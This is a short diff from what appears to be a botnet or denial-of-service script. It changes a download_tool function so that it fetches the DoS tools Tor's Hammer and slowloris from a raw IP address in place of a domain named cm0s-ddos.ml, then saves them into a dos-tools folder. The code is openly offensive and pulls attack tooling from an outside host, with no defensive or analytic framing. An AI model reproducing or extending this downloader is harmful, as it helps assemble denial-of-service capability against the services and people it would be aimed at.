@@ -12,8 +12,8 @@ def download_tool():
         print('[!] Tool DoS exists')    
         return
     print('[!] Botnet download tool DoS')
-    urls = ['https://cm0s-ddos.ml/dos-tools/torshammer1.0.zip',
-    'https://cm0s-ddos.ml/dos-tools/slowloris.py']
+    urls = ['http://35.173.186.230/dos-tools/torshammer1.0.zip',
+    'http://35.173.186.230/dos-tools/slowloris.py']
     
     f = open('tool.txt', 'w')
     if not os.path.exists('dos-tools'):
